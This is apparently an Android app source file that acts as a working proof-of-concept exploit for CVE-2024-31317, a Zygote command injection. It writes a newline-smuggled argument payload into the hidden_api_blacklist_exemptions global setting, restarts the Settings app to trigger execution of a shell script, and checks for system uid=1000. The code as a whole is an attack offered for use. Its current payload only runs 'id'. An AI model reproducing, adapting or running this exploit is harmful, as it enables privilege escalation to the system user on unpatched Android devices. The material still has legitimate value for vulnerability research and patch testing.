package com.example.tzpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final String TAG = "ZygoteInjection";
    private static final String SETTING_KEY = "hidden_api_blacklist_exemptions";
    private static final String TARGET_PKG = "com.android.settings";
    private static final String SCRIPT_PATH = "/data/local/tmp/run_id.sh";
    private static final String RESULT_PATH = "/data/local/tmp/result.txt";

    private TextView tvStatus, tvLog;
    private StringBuilder logBuilder = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);

        appendLog("=== CVE-2024-31317 Zygote Injection PoC ===");

        // 1. スクリプト作成
        if (!createScript()) {
            tvStatus.setText("❌ Script creation failed");
            return;
        }
        appendLog("[+] Script created: " + SCRIPT_PATH);

        // 2. 実行権限付与
        if (!chmodScript()) {
            appendLog("[-] chmod failed, but continuing...");
        }

        // 3. ペイロード注入
        if (!injectPayload()) {
            tvStatus.setText("❌ Injection failed");
            return;
        }
        appendLog("[+] Payload injected.");

        // 4. トリガー（Settings再起動）
        triggerExploit();

        // 5. 結果確認（遅延実行）
        new android.os.Handler().postDelayed(this::checkResult, 5000);

        saveLog();
    }

    private boolean createScript() {
        try {
            File script = new File(SCRIPT_PATH);
            File parent = script.getParentFile();
            if (parent != null && !parent.exists()) {
                parent.mkdirs();
            }
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(script))) {
                pw.println("#!/system/bin/sh");
                pw.println("id > " + RESULT_PATH);
            }
            return true;
        } catch (Exception e) {
            appendLog("Script error: " + e.getMessage());
            return false;
        }
    }

    private boolean chmodScript() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "chmod 755 " + SCRIPT_PATH});
            return p.waitFor() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean injectPayload() {
        try {
            // 現在の値をバックアップ
            String current = Settings.Global.getString(getContentResolver(), SETTING_KEY);
            appendLog("[+] Current: " + (current != null ? current.replace("\n", "\\n") : "null"));

            // ペイロード（シンプルかつ確実）
            String payload = "L*\n" +
                    "--runtime-args\n" +
                    "--invoke-with\n" +
                    "/system/bin/sh\n" +
                    SCRIPT_PATH + "\n" +
                    "--package-name=" + TARGET_PKG + "\n" +
                    "android.app.ActivityThread";

            appendLog("[+] Payload: " + payload.replace("\n", "\\n"));

            boolean result = Settings.Global.putString(getContentResolver(), SETTING_KEY, payload);
            appendLog("[+] putString result: " + result);

            // 検証
            String verify = Settings.Global.getString(getContentResolver(), SETTING_KEY);
            appendLog("[+] Verified: " + (verify != null ? verify.replace("\n", "\\n") : "null"));

            return result;
        } catch (Exception e) {
            appendLog("[-] Injection error: " + e.getMessage());
            return false;
        }
    }

    private void triggerExploit() {
        appendLog("[*] Restarting " + TARGET_PKG + "...");
        try {
            // 強制停止
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "am force-stop " + TARGET_PKG});
            p.waitFor();
            Thread.sleep(1000);
            // 再起動
            p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "am start -n " + TARGET_PKG + "/.Settings"});
            p.waitFor();
            appendLog("[+] Restart triggered.");
        } catch (Exception e) {
            appendLog("[-] Trigger error: " + e.getMessage());
        }
    }

    private void checkResult() {
        appendLog("[*] Checking " + RESULT_PATH);
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "cat " + RESULT_PATH + " 2>/dev/null || echo 'NOT FOUND'"});
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) out.append(line).append("\n");
            p.waitFor();

            String content = out.toString().trim();
            appendLog("[+] Result:\n" + content);

            if (content.contains("uid=1000")) {
                appendLog("[!!!] SUCCESS: uid=1000 !!!");
                tvStatus.setText("✅ SUCCESS: uid=1000");
            } else if (content.contains("NOT FOUND")) {
                appendLog("[-] Result file not found.");
                tvStatus.setText("❌ No result file");
            } else {
                tvStatus.setText("⚠️ " + content);
            }
        } catch (Exception e) {
            appendLog("[-] Check error: " + e.getMessage());
        }
    }

    private void appendLog(String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS").format(new Date());
        String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        Log.d(TAG, msg);
        runOnUiThread(() -> tvLog.append(line));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) return;
            File file = new File(dir, "zygote_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(file))) {
                pw.print(logBuilder.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Save log failed");
        }
    }
}
